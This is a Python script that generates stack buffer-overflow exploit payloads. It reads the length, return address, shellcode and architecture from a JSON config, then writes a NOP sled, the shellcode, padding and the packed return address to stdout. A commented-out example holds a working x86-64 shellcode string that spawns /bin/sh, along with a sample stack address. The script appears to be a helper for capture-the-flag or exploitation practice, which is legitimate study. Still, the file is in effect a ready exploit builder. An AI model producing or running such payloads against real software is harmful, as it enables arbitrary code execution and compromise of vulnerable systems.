import argparse
import json
import struct
import sys
import os

def process_shellcode(shellcode):
    """
    Process shellcode in different formats and convert to bytes.
    Handles raw hex string or escaped hex format.
    """
    if isinstance(shellcode, bytes):
        return shellcode

    if all(c in '0123456789abcdefABCDEF' for c in shellcode):
        return bytes.fromhex(shellcode)

    return bytes.fromhex(shellcode.replace('\\x', ''))


def generate_payload(total_length, ret_addr, shellcode, arch, nop_size=40, use_padding=True):
    """
    Generate a payload for buffer overflow exploits.

    Parameters:
    - total_length: Total length of the payload
    - ret_addr: Return address as a hex string (e.g., "0xffffc8e0")
    - shellcode: Shellcode in various formats (converted to bytes internally)
    - arch: Architecture (32 or 64)
    - nop_size: Size of NOP sled (default: 40, used when use_padding is True)
    - use_padding: Whether to use padding bytes (default: True)

    Returns:
    - Bytes of the complete payload
    """
    shellcode_bytes = process_shellcode(shellcode)

    if isinstance(ret_addr, str):
        ret_addr = int(ret_addr, 16)

    if arch == 32:
        addr = struct.pack("<I", ret_addr)
    elif arch == 64:
        addr = struct.pack("<Q", ret_addr)
    else:
        raise ValueError("Architecture must be 32 or 64")

    available_space = total_length - len(shellcode_bytes) - len(addr)

    if available_space < 0:
        raise ValueError(
            f"Total length too small for payload components (need at least {len(shellcode_bytes) + len(addr)} bytes)")

    if use_padding:
        if nop_size > available_space:
            raise ValueError(f"NOP sled size ({nop_size}) exceeds available space ({available_space})")

        nop_sled = b"\x90" * nop_size
        padding = b"\x41" * (available_space - nop_size)
        payload = nop_sled + shellcode_bytes + padding + addr
    else:
        nop_sled = b"\x90" * available_space
        payload = nop_sled + shellcode_bytes + addr

    return payload

# def main():
#     length = 272
#     address = "0x7fffffffd554"
#     shellcode = "48b82f62696e2f73680050545f31c050b03b545a545e0f05"
#     arch = 64
#     nop = 40
#     no_padding = False
#
#     payload = generate_payload(
#         total_length=length,
#         ret_addr=address,
#         shellcode=shellcode,
#         arch=arch,
#         nop_size=nop,
#         use_padding=not no_padding
#     )
#
#     print(payload)



# Get the directory where the script is located
script_dir = os.path.dirname(os.path.abspath(__file__))
# Create path to config file relative to script location
config_path = os.path.join(script_dir, "payload_config.json")

try:
    with open(config_path, 'r') as f:
        config = json.load(f)
except (json.JSONDecodeError, FileNotFoundError) as e:
    print(f"Error loading config file: {e}", file=sys.stderr)
    sys.exit(1)

config.setdefault('nop', 40)
config.setdefault('no_padding', False)

required_params = ['length', 'address', 'shellcode', 'arch']
missing = [param for param in required_params if param not in config]
if missing:
    print(f"Missing required parameters in config file: {', '.join(missing)}", file=sys.stderr)
    sys.exit(1)

try:
    payload = generate_payload(
        total_length=config['length'],
        ret_addr=config['address'],
        shellcode=config['shellcode'],
        arch=config['arch'],
        nop_size=config['nop'],
        use_padding=not config['no_padding']
    )

    sys.stdout.buffer.write(payload)

except Exception as e:
    print(f"Error: {e}", file=sys.stderr)
    sys.exit(1)
